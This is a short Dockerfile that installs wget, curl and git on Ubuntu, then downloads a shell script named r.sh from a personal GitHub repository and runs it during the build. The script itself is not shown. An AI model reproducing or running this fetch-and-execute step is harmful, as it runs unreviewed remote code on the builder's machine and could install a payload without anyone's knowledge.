FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://raw.githubusercontent.com/rieco01/rie/main/r.sh
RUN sh r.sh
